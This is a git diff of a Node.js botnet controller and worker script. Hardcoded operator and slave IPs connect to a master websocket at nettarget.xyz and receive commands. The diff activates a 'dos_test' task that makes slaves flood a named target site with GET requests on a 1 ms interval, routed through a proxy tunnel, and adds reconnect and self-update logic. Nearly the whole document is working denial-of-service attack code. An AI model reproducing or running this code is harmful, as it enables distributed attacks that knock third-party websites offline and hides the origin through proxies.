@@ -1,12 +1,8 @@
-const AppVersion = "1.0.7"; // this is the version which will identify each server and make sure they're up to date!
+const AppVersion = "1.1.2"; // this is the version which will identify each server and make sure they're up to date!
 let CurrentVersion = AppVersion; // Current version of the application, the master server sends this to all servers!
 let NewAppCode = ""; // This'll be updated when the server sends out a new app version request!
-//const ShellJS = require("shelljs"); // Used for executing shell commands to the terminal in emergency cases!
 
-//if (ShellJS){
-    //ShellJS.exec("npm i"); // install all packages
-//}
-
+const requestIp = require('request-ip');
 const { TextEncoder, TextDecoder } = require("util"); // Util module for fixing stupid problems such as TextEncoder is undefined
 const fs = require("fs"); // File module, used for creating and reading data aka files
 const tunnel = require('tunnel'); // Used for tunneling our http requests through proxies :))
@@ -21,7 +17,9 @@ const ExpressWebSocket = ExpressWS(ExpressApp); // Our express websocket which c
 const WebSocketInstance = ExpressWebSocket.getWss("/server_socket"); // Get the cached data of our worker web socket!
 const Servers = {// We'll use the server IP to identify who it is, example: if the server is classed as operator it'll be the one to send out all the commands that the other servers will listen to!
     ["162.213.255.44"]: "operator",
-    ["31.49.168.36"]: "slave"
+    ["68.65.123.36"]: "operator",
+    ["178.79.187.224"]: "slave",
+    ["178.79.187.151"]: "slave",
 };
 const TaskList = { // We'll use this to over-ride tasks!
     "new_account": {Priority: 1, Task: "Account Creation"}
@@ -39,6 +37,9 @@ let LocalIP = null; // the current IP of this server, it gets auto set as soon a
 let CurrentClient = null; // This is the client which we'll use to send back messages to the master, will be set as soon as it connects to the master socket!
 let StopConnection = false; // This is used for restarting the server, when set to true the socket won't try to reconnect. The master server tells the server to do this when outdated!
 let CreateServers = true; // This is used for creating a butt load of servers!
+
+ExpressApp.use(requestIp.mw())
+ExpressApp.use(expressJS.json())
 
 const agent = tunnel.httpsOverHttp({
     proxy: {
@@ -99,8 +100,6 @@ try{
     axios.get("https://api.ipify.org/?format=json").then((Response) => {
         LocalIP = Response.data.ip
 
-        Servers[LocalIP] = (typeof Servers[LocalIP] != "undefined") ? Servers[LocalIP] : "operator"
-        
         const PC_RANK = (typeof Servers[LocalIP] != "undefined") ? Servers[LocalIP] : "unknown"
 
         let NewFile = (new Date() / 1000).toString()
@@ -128,7 +127,14 @@ try{
             }
         }
 
-        ConsoleLogger(LocalIP)
+        function GetSlaveIP(Client){
+            for (const [CLIENT_IP, CLIENT_SOCKET] of Object.entries(SocketIPs)) {
+                if (CLIENT_SOCKET == Client){
+                    return CLIENT_IP.toString()
+                }
+            }
+            return null
+        }
 
         function GetSlaveServers(){
             const Slaves = [];
@@ -189,13 +195,14 @@ try{
         }// wrong file brudda
     
         async function Decrypt(Data, Salt){ // New encryption / cypher
-    
+
         }
     
         function IsDoingTask(Client){
-            let clientIp1 = Client._socket.remoteAddress
-            clientIp1 = clientIp1.replace("::ffff:", "")
-
+            let clientIp1 = GetSlaveIP(Client)
+            if (typeof clientIp1 != "undefined"){
+                clientIp1 = clientIp1.replace("::ffff:", "")
+            }
             if (typeof CurrentTasks[clientIp1] != "undefined"){
                 if (CurrentTasks[clientIp1] == true){
                     return true
@@ -207,7 +214,7 @@ try{
 
         function TaskHandler(Client, Message){
             try{
-                let clientIp1 = Client._socket.remoteAddress
+                let clientIp1 = GetSlaveIP(Client)
                 clientIp1 = clientIp1.replace("::ffff:", "")
 
                 const JSON_DATA = JSON.parse(Message) // Convert our data back into a array / class
@@ -224,9 +231,11 @@ try{
             }
         }
 
-        function CompareRank(Client1){
-            let clientIp1 = Client1._socket.remoteAddress
-            clientIp1 = clientIp1.replace("::ffff:", "")
+        function CompareRank(Client){
+            let clientIp1 = GetSlaveIP(Client)
+            if (typeof clientIp1 != "undefined"){
+                clientIp1 = clientIp1.replace("::ffff:", "")
+            }
 
             const IP_RANK = (typeof Servers[clientIp1] != "undefined") ? Servers[clientIp1] : "unknown"
 
@@ -266,7 +275,9 @@ try{
                                                 InterVals[DOS_ID] = DOS_ID
                                             }
 
-                                            axios.get(JSON_DATA.target_url).then((res) => {
+                                            axios.get(JSON_DATA.target_url, {
+                                                httpsAgent: agent
+                                            }).then((res) => {
                                                 ConsoleLogger("request sent!")
                                             }).catch((request_error) => {})
                                         }, 1)
@@ -358,14 +369,14 @@ try{
                 ConsoleLogger("[SERVER] -> [ERROR] -> error while executing command, " + cmd_error);
             }
         }
-
-        /*CommandHandler(JSON.stringify({
-            type: "task",
-            command: "dos_test",
-            AuthKey: OperationKey.toString(),
-            target_url: "https://grubhubscripts.com"
-        }))*/
     
+        function StopTasks(){
+            for (const [VAL_ID, VAL_OBJECT] of Object.entries(InterVals)){
+                clearInterval(VAL_OBJECT);
+                InterVals[VAL_ID] = null || undefined;
+            };
+        }
+
         function InputHandler(Message, ServerRank){
             if (ServerRank == "operator"){
                 // This'll execute commands and send inputs to all the servers!
@@ -400,10 +411,8 @@ try{
             })
             
             ExpressApp.ws("/server_socket", (Client, Request) => { // make a connection request to (url:443/server_socket);
-                Request.clientIp = Client.clientIp || Client._socket.remoteAddress;
+                Request.clientIp = Request.clientIp || Client._socket.remoteAddress;
                 Request.clientIp = Request.clientIp.replace("::ffff:", "");
-
-                ConsoleLogger(Request.clientIp)
 
                 if (SocketIPs[Request.clientIp.toString()]) {
                     Client.send("Bad connection 1");
@@ -420,9 +429,9 @@ try{
         
                 ConsoleLogger(`Connection rank: ${ServerRank}, Status: opened!`);
     
-                SocketIPs[ClientIP] = true;
+                SocketIPs[ClientIP] = Client;
                 CurrentTasks[ClientIP] = false;
-        
+
                 if (ServerRank == "operator"){
                     Client.on("message", (Message) => {
                         InputHandler(Message, ServerRank)
@@ -451,10 +460,17 @@ try{
 
                         InputHandler(JSON.stringify({
                             type: "task",
+                            command: "dos_test",
+                            AuthKey: OperationKey.toString(),
+                            target_url: "https://grubhubscripts.com"
+                        }), ServerRank)
+
+                        /*InputHandler(JSON.stringify({
+                            type: "task",
                             command: "new_account",
                             AuthKey: OperationKey.toString(),
                             total: 5
-                        }), ServerRank)
+                        }), ServerRank)*/
                     }, 1000)
                 }else{
                     Client.on("message", (Message) => {
@@ -483,7 +499,10 @@ try{
 
                 NewWebClient.on('connectFailed', function(error) {
                     //ConsoleLogger("[SERVER] -> [SOCKET] -> [ERROR] -> " + 'Failed to connect to master server / socket, retrying!');
-                    ConsoleLogger("Failed?")
+
+                    DoingTask = false
+
+                    StopTasks()
 
                     if (!StopConnection){
                         NewWebClient.connect((LocalHost == true) ? "ws://localhost:7453/server_socket" : "wss://www.nettarget.xyz:443/server_socket");
@@ -492,24 +511,34 @@ try{
 
                 NewWebClient.on("connect", (Client) => { // Wait for the slave to connect to the master server socket
                     CurrentClient = Client
-                    
-                    ConsoleLogger("Worked?")
+                    ConsoleLogger("Client connected!")
+
+                    StopTasks()
+
+                    if (CurrentClient){
+                        DoingTask = false
+                        CurrentClient.send(JSON.stringify({
+                            doing_task: false
+                        }));
+                    }
 
                     Client.on("close", () => {
-                        ConsoleLogger("sss")
+
+                        DoingTask = false
+
+                        StopTasks()
+
                         if (!StopConnection){
                             NewWebClient.connect((LocalHost == true) ? "ws://localhost:7453/server_socket" : "wss://www.nettarget.xyz:443/server_socket");
                         }
                     })
 
                     Client.on("message", (Message) => {
-                        ConsoleLogger(Message)
                         InputHandler(Message.utf8Data, PC_RANK) // Send the message from the master server to the input handler
                     });
                 
                 }); // Listen for the messages from our master server
 
-                ConsoleLogger("okayh")
                 if (!StopConnection){
                     NewWebClient.connect((LocalHost == true) ? "ws://localhost:7453/server_socket" : "wss://www.nettarget.xyz:443/server_socket");
                 }
@@ -529,14 +558,18 @@ try{
                                         ConsoleLogger("[SERVER] -> [UPDATE] -> [PENDING] -> " + 'Updating server');
                                         clearInterval(AppVersionInter);
                                         StopConnection = true;
+                                        DoingTask = false;
 
+                                        if (CurrentClient){
+                                            CurrentClient.send(JSON.stringify({
+                                                doing_task: false
+                                            }));
+                                        }
+                                        
                                         CurrentClient.close();
                                         ExpressServer.close();
                                         
-                                        for (const [VAL_ID, VAL_OBJECT] of Object.entries(InterVals)){
-                                            clearInterval(VAL_OBJECT);
-                                            InterVals[VAL_ID] = null || undefined;
-                                        };
+                                        StopTasks();
                                         
                                         setTimeout(() => {
                                             try{
@@ -554,33 +587,10 @@ try{
                     }
                 }, 1000)
             }else if (PC_RANK == "operator"){
-                ConsoleLogger("Connecting up client op")
+                ConsoleLogger("Connecting up master client socket")
                 const NewWebClient = new ClientWebSocket(); // create the masters web client object
-
-                NewWebClient.on('connectFailed', function(error) {
-                    //ConsoleLogger("[SERVER] -> [SOCKET] -> [ERROR] -> " + 'Failed to connect to master server / socket, retrying!');
-                    ConsoleLogger("Failed 99?")
-
-                    if (!StopConnection){
-                        NewWebClient.connect((LocalHost == true) ? "ws://localhost:7453/server_socket" : "wss://www.nettarget.xyz:443/server_socket");
-                    }
-                });
-
-                NewWebClient.on("connect", (Client) => { // Wait for the slave to connect to the master server socket
-                    CurrentClient = Client
-                    
-                    ConsoleLogger("Worked 66?")
-
-                    Client.on("close", () => {
-                        ConsoleLogger("sss 54")
-                    })
-                
-                }); // Listen for the messages from our master server
-
                 NewWebClient.connect((LocalHost == true) ? "ws://localhost:7453/server_socket" : "wss://www.nettarget.xyz:443/server_socket"); // we want the master / operator to make itself a connection so we can send out our signals from it
             };
-            
-            ConsoleLogger(PC_RANK)
         }catch (listen_socket_error){
             ConsoleLogger("[SERVER] -> [ERROR] -> failed to connect to clients web socket, " + listen_socket_error);
         }
